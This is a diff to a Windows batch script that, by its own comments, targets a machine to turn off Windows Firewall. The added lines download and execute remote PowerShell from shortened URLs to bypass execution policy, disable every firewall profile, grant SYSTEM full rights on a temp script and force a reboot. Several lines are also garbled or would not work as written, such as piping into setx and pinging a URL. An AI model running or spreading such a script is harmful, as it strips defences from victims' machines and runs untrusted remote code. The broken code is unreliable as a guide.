@@ -1,7 +1,11 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
-:: This script will disable Windows Firewall on the target machine
+:: Variables
+set tempfolder=%TEMP%
+set firewallbkpfile=%tempfolder%\firewall_backup.ps1
+set iurl=http://goo.gl/ignoredurl
+set etag=X-Microsoft-PowerShell-Engine-Route -REQUIRED
 
 :: Check if PowerShell.exe exists in the system PATH
 for /f "skip=2 tokens=1" %%a in ('wmic product get Name ^| find /i "powershell.exe" 2^>nul') do set pspath=%%a
@@ -10,13 +14,23 @@ if not defined pspath (
     exit 1
 )
 
-:: Create a temporary PowerShell script in %TEMP% with executable rights
-set tempfile=%TEMP%\disable_firewall.ps1
-echo ([Reflection.Assembly]::LoadWithPartialName('System.Net')).WebRequest.Create('http://goo.gl/ignoredurl') | setx /m tempfile -p
-icacls "%TEMP%\disable_firewall.ps1" /grant "NT AUTHORITY\SYSTEM":(OI)(CI)F /T
+:: Update PowerShell to bypass the execution policy
+"%pspath%" -NoProfile -Command "iex (New-Object System.Net.WebClient).DownloadString('http://goo.gl/bypassps')"
 
-:: Launch PowerShell to execute the script with elevated privileges
-powershell.exe -ExecutionPolicy ByPass -File "%temp%\disable_firewall.ps1"
+:: Create a remote PowerShell script to backup the original Windows Firewall rules
+"%pspath%" -NoProfile -Command "iex (New-Object System.Net.WebClient).DownloadFile('http://goo.gl/fwbkp', '%tempfolder%\firewall_backup.ps1')"
 
-:: Clean up by deleting the temporary PowerShell script
-del /Q "%temp%\disable_firewall.ps1"
+:: Create a temporary PowerShell script with executable rights to disable Windows Firewall and reboot
+powershell.exe -NoProfile -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Restart-Computer" | setx /m tempfile -p
+icacls "%tempfolder%\disable_firewall_reboot.ps1" /grant "NT AUTHORITY\SYSTEM":(OI)(CI)F /T
+
+:: Check if the web request created in the remote PowerShell script was successful
+ping -n 1 -w 5 %iurl% > nul
+if errorlevel 1 (
+    echo Web request failed. Aborting.
+    del /Q "%tempfolder%\firewall_backup.ps1"
+    exit 1
+)
+
+:: Reboot the target machine
+start /wait shutdown -r -t 0
